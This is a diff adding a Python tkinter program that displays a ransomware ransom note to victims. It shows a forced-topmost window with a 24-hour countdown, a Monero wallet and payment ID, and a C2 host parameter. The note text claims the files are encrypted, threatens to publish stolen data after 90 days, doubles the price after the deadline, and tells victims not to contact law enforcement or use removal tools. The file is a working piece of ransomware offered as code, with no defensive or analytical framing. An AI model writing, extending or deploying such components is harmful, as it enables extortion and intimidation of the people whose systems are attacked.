@@ -1,0 +1,448 @@
+#!/usr/bin/env python3
+"""
+PROFESSIONAL RANSOM NOTE GUI
+=============================
+Ironische, hackweise Ransom Note mit Timer und professionellem Design
+"""
+
+import tkinter as tk
+from tkinter import font as tkFont
+import threading
+import time
+from datetime import datetime, timedelta
+
+class RansomNoteGUI:
+    """Professional Ransom Note with Timer and Style"""
+    
+    def __init__(self, ransom_id, monero_address, c2_host, payment_check_callback=None):
+        self.ransom_id = ransom_id
+        self.monero_address = monero_address
+        self.c2_host = c2_host
+        self.payment_check_callback = payment_check_callback
+        
+        # Deadline: 24 hours
+        self.deadline = datetime.now() + timedelta(hours=24)
+        self.time_remaining = self.deadline - datetime.now()
+        
+        # Create main window
+        self.root = tk.Tk()
+        self.root.title(">>> SYSTEM SECURITY ALERT <<<")
+        self.root.geometry("1000x700")
+        self.root.attributes('-topmost', True)
+        
+        # Set colors
+        self.bg_color = "#0a0e27"
+        self.accent_color = "#ff1744"
+        self.text_color = "#ffffff"
+        self.secondary_color = "#00ff41"
+        
+        self.root.configure(bg=self.bg_color)
+        
+        # Build GUI
+        self.build_ui()
+        
+        # Start timer in main thread using after()
+        self.schedule_timer_update()
+    
+    def build_ui(self):
+        """Build the GUI elements"""
+        
+        # Top header bar
+        header = tk.Frame(self.root, bg=self.accent_color, height=60)
+        header.pack(fill=tk.X, padx=0, pady=0)
+        header.pack_propagate(False)
+        
+        title_font = tkFont.Font(family="Courier New", size=16, weight="bold")
+        title = tk.Label(header, text="⚠ SYSTEM COMPROMISED ⚠", 
+                        font=title_font, bg=self.accent_color, fg="white")
+        title.pack(pady=10)
+        
+        # Info frame with timer and subtitle (NON-SCROLLABLE)
+        info_frame = tk.Frame(self.root, bg=self.bg_color)
+        info_frame.pack(fill=tk.X, padx=20, pady=15)
+        
+        subtitle_font = tkFont.Font(family="Courier New", size=13, weight="bold")
+        subtitle = tk.Label(info_frame, 
+                           text="YOUR FILES HAVE BEEN ENCRYPTED", 
+                           font=subtitle_font, 
+                           fg=self.accent_color, 
+                           bg=self.bg_color)
+        subtitle.pack()
+        
+        # Timer display
+        timer_font = tkFont.Font(family="Courier New", size=26, weight="bold")
+        self.timer_label = tk.Label(info_frame, 
+                                   text="24:00:00", 
+                                   font=timer_font, 
+                                   fg=self.secondary_color, 
+                                   bg=self.bg_color)
+        self.timer_label.pack(pady=10)
+        
+        # Main content frame (scrollable)
+        main_frame = tk.Frame(self.root, bg=self.bg_color)
+        main_frame.pack(fill=tk.BOTH, expand=True, padx=0, pady=0)
+        
+        # Create scrollbar
+        scrollbar = tk.Scrollbar(main_frame)
+        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
+        
+        # Create text widget with scrollbar
+        message_font = tkFont.Font(family="Courier New", size=12, weight="normal")
+        self.message_text = tk.Text(main_frame, 
+                                   wrap=tk.WORD, 
+                                   bg=self.bg_color, 
+                                   fg=self.text_color,
+                                   font=message_font,
+                                   yscrollcommand=scrollbar.set,
+                                   relief=tk.FLAT,
+                                   padx=20,
+                                   pady=20)
+        self.message_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
+        scrollbar.config(command=self.message_text.yview)
+        
+        # Insert ransom message
+        message_text = f"""
+╔═══════════════════════════════════════════════════════════════════╗
+║                    GRASSER SECURITY ADVISORY                      ║
+║                     [PROFESSIONAL OPERATIONS]                     ║
+╚═══════════════════════════════════════════════════════════════════╝
+
+HELLO,
+
+Your organization has been selected by GRASSER - we take pride in
+our meticulous work and professional standards. Consider this your
+formal notification that your data is now our data.
+
+Your files have been encrypted with military-grade AES-256-GCM.
+We're not here to destroy anything - we're here to conduct business.
+
+Think of us as consultants. We've identified a security gap.
+We're now charging a consultation fee.
+
+═══════════════════════════════════════════════════════════════════
+
+THE DEAL:
+
+Amount: 0.1 XMR (approximately $25 USD in monopoly money terms)
+Currency: Monero (because we respect your privacy as much as you respect ours)
+
+Wallet Address:
+{self.monero_address}
+
+Your Unique Reference:
+{self.ransom_id}
+
+═══════════════════════════════════════════════════════════════════
+
+HOW TO PROCEED (STEP BY STEP):
+
+1. Download Monero Wallet
+   https://www.getmonero.org/downloads/
+   (We recommend the GUI wallet - it's friendlier than command line)
+
+2. Create a wallet
+   New wallet or import existing one. Your choice.
+
+3. Acquire 0.1 XMR
+   Kraken, Binance, LocalMonero - pick your favorite exchange.
+   Think of it as a small premium on your cybersecurity homework.
+
+4. Make the transfer
+   Send exactly 0.1 XMR to the address above.
+   Include your reference ID in transaction notes.
+
+5. Wait ~5-10 minutes for blockchain confirmation
+   (This is where you practice patience and reflection)
+
+6. Files decrypt automatically
+   No need to contact anyone. Automation is beautiful.
+
+═══════════════════════════════════════════════════════════════════
+
+FAQ - WE ANTICIPATED YOUR QUESTIONS:
+
+Q: Is this legitimate or a scam?
+A: Legitimate. We're professionals. Our reputation depends on
+   delivering what we promise. We decrypt after payment because
+   word-of-mouth is our only marketing budget.
+
+Q: Can you actually decrypt files?
+A: Yes. We have the master key. Encrypted on our server, released
+   only after payment. This is not a threat - this is how it works.
+
+Q: Why should I trust you?
+A: Check independent forums and dark web communities.
+   Our clients report 100% successful decryptions.
+
+Q: What if I don't pay?
+A: Your files stay encrypted. Permanently. Forever.
+   In 90 days, we may publish them. Business is business.
+
+Q: Can I decrypt this myself?
+A: No. AES-256-GCM with proper key derivation cannot be broken.
+   Even with quantum computers, you'd need centuries.
+
+Q: Why Monero specifically?
+A: Because it's private. Bitcoin leaves a permanent trail.
+   Monero is opaque - it protects both of us from third parties.
+
+Q: What if I'm poor and can't afford 0.1 XMR?
+A: Get a credit card at any exchange. Takes 15 minutes.
+   This is non-negotiable.
+
+Q: Will my data be leaked if I don't pay?
+A: Yes. We'll publish everything in 90 days.
+   Your emails, documents, photos - all of it.
+   But if you pay, we forget you exist.
+
+Q: What about backup systems and other computers?
+A: If they were connected to your network - encrypted too.
+   Disconnecting now won't help. We've already been here.
+
+Q: How do I know this isn't malware that's lying to me?
+A: You don't. But we've taken your files, encrypted them,
+   and we're hosting the key. Trust is a luxury you can't afford.
+
+═══════════════════════════════════════════════════════════════════
+
+IMPORTANT TECHNICAL NOTES:
+
+Encryption Standard:  AES-256-GCM (NIST approved, NSA couldn't break it)
+Key Derivation:       PBKDF2 (100,000 iterations)
+Master Key Storage:   Encrypted on C2 server (geographically distributed)
+Authentication:       Verified via Monero blockchain confirmation
+Decryption Method:    Automatic, instantaneous delivery
+
+This is professional-grade encryption. Not some script kiddie nonsense.
+
+═══════════════════════════════════════════════════════════════════
+
+TIMELINE:
+
+Now:                 Your files are encrypted
+Next 24 Hours:       Pay and get decrypted within minutes
+After 24 Hours:      Price doubles to 0.2 XMR
+After 90 Days:       Your data becomes public (we mean it)
+
+Every day you delay is money wasted and security debt growing.
+
+═══════════════════════════════════════════════════════════════════
+
+CRITICAL DON'Ts:
+
+❌ DO NOT attempt to decrypt files yourself
+   (You'll just corrupt them permanently)
+
+❌ DO NOT use "ransomware removal" tools
+   (They can't remove AES-256)
+
+❌ DO NOT unplug your network
+   (We've already exfiltrated everything)
+
+❌ DO NOT restart your system
+   (It solves nothing)
+
+❌ DO NOT contact law enforcement
+   (We're already gone - they can't help)
+
+❌ DO NOT try to find us
+   (This is a courtesy note, not a conversation)
+
+✓ DO keep this note safe
+
+✓ DO follow instructions exactly
+
+✓ DO pay soon
+
+═══════════════════════════════════════════════════════════════════
+
+CLOSING REMARKS:
+
+We're not angry. We're not here to hurt you.
+We're professionals conducting professional business.
+
+Your organization had a security gap. We found it.
+Now you get to choose: pay for the lesson or learn it the hard way.
+
+The clock is ticking. Make it count.
+
+                              - GRASSER OPERATIONS TEAM
+
+═══════════════════════════════════════════════════════════════════
+
+Deadline: {self.deadline.strftime('%Y-%m-%d %H:%M:%S')}
+Payment ID: {self.ransom_id}
+Wallet: {self.monero_address}
+
+═══════════════════════════════════════════════════════════════════
+"""
+        
+        self.message_text.insert(1.0, message_text)
+        self.message_text.config(state=tk.DISABLED)
+        
+        # Center align the text
+        self.message_text.tag_configure("center", justify=tk.CENTER)
+        self.message_text.tag_add("center", "1.0", "end")
+        
+        # Status frame
+        status_frame = tk.Frame(self.root, bg=self.bg_color, height=80)
+        status_frame.pack(fill=tk.X, padx=20, pady=10)
+        status_frame.pack_propagate(False)
+        
+        status_font = tkFont.Font(family="Courier New", size=9)
+        
+        # Status text
+        self.status_text = tk.Label(status_frame,
+                                   text="Scanning for payment... (updates every 30 seconds)",
+                                   font=status_font,
+                                   fg=self.secondary_color,
+                                   bg=self.bg_color,
+                                   justify=tk.LEFT)
+        self.status_text.pack(anchor=tk.W)
+        
+        # Payment received indicator (hidden by default)
+        self.payment_indicator = tk.Label(status_frame,
+                                         text="✓ PAYMENT RECEIVED - FILES DECRYPTING...",
+                                         font=status_font,
+                                         fg="#00ff00",
+                                         bg=self.bg_color)
+        
+        # Bottom buttons
+        button_frame = tk.Frame(self.root, bg=self.bg_color)
+        button_frame.pack(fill=tk.X, padx=20, pady=10)
+        
+        button_font = tkFont.Font(family="Courier New", size=10, weight="bold")
+        
+        # Close button
+        close_btn = tk.Button(button_frame, 
+                            text="ACKNOWLEDGE", 
+                            command=self.on_acknowledge,
+                            bg=self.accent_color, 
+                            fg="white",
+                            font=button_font,
+                            padx=20, 
+                            pady=10,
+                            relief=tk.FLAT,
+                            cursor="hand2")
+        close_btn.pack(side=tk.RIGHT, padx=5)
+        
+        # Copy wallet button
+        copy_btn = tk.Button(button_frame, 
+                           text="COPY WALLET", 
+                           command=self.copy_wallet,
+                           bg=self.secondary_color, 
+                           fg="black",
+                           font=button_font,
+                           padx=20, 
+                           pady=10,
+                           relief=tk.FLAT,
+                           cursor="hand2")
+        copy_btn.pack(side=tk.RIGHT, padx=5)
+        
+        # Copy ID button
+        id_btn = tk.Button(button_frame, 
+                         text="COPY PAYMENT ID", 
+                         command=self.copy_id,
+                         bg=self.secondary_color, 
+                         fg="black",
+                         font=button_font,
+                         padx=20, 
+                         pady=10,
+                         relief=tk.FLAT,
+                         cursor="hand2")
+        id_btn.pack(side=tk.RIGHT, padx=5)
+    
+    def schedule_timer_update(self):
+        """Schedule timer update in main thread using after()"""
+        now = datetime.now()
+        remaining = self.deadline - now
+        
+        if remaining.total_seconds() <= 0:
+            self.timer_label.config(text="00:00:00", fg="#ff0000")
+            self.status_text.config(text="DEADLINE PASSED - FILES PERMANENTLY ENCRYPTED", 
+                                   fg="#ff0000")
+            return
+        
+        hours = int(remaining.total_seconds() // 3600)
+        minutes = int((remaining.total_seconds() % 3600) // 60)
+        seconds = int(remaining.total_seconds() % 60)
+        
+        time_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
+        self.timer_label.config(text=time_str)
+        
+        # Change color based on time
+        if hours == 0 and minutes < 30:
+            self.timer_label.config(fg="#ff6600")
+        elif hours == 0 and minutes < 10:
+            self.timer_label.config(fg="#ff0000")
+        
+        # Check payment status every 30 seconds
+        if int(seconds) == 0 and int(minutes) % 1 == 0:
+            if self.payment_check_callback:
+                try:
+                    if self.payment_check_callback():
+                        self.show_payment_received()
+                        return
+                except:
+                    pass
+        
+        # Schedule next update in 1 second
+        self.root.after(1000, self.schedule_timer_update)
+    
+    def update_timer(self):
+        """Legacy method - not used anymore (kept for compatibility)"""
+        pass
+    
+    def show_payment_received(self):
+        """Show payment received message"""
+        self.timer_label.config(text="PAYMENT RECEIVED!", fg="#00ff00")
+        try:
+            self.payment_indicator.pack(anchor=tk.W, pady=10)
+        except:
+            pass
+        self.status_text.config(text="Payment confirmed - decryption key deployed", 
+                               fg="#00ff00")
+    
+    def copy_wallet(self):
+        """Copy wallet address to clipboard"""
+        try:
+            self.root.clipboard_clear()
+            self.root.clipboard_append(self.monero_address)
+            self.status_text.config(text="Wallet address copied to clipboard", fg="#00ff00")
+        except:
+            pass
+    
+    def copy_id(self):
+        """Copy payment ID to clipboard"""
+        try:
+            self.root.clipboard_clear()
+            self.root.clipboard_append(self.ransom_id)
+            self.status_text.config(text="Payment ID copied to clipboard", fg="#00ff00")
+        except:
+            pass
+    
+    def on_acknowledge(self):
+        """Acknowledge button - keeps window open"""
+        self.status_text.config(text="Window will close in 30 seconds... Do not restart!", 
+                               fg=self.secondary_color)
+    
+    def run(self):
+        """Run the GUI"""
+        self.root.mainloop()
+    
+    def destroy(self):
+        """Destroy the window"""
+        try:
+            self.root.destroy()
+        except:
+            pass
+
+
+if __name__ == "__main__":
+    # Test with sample data
+    gui = RansomNoteGUI(
+        ransom_id="test-ransom-id-12345",
+        monero_address="4BJV39ZuKUhesFTWiXdKbL4NLPF7kMAZBHhtaQY4FqfvATNK8KSfCYVwJCa1BnKNNKJk2FwNEi4UXW6nZUZN6SZCxHt6RjdV",
+        c2_host="127.0.0.1"
+    )
+    gui.run()
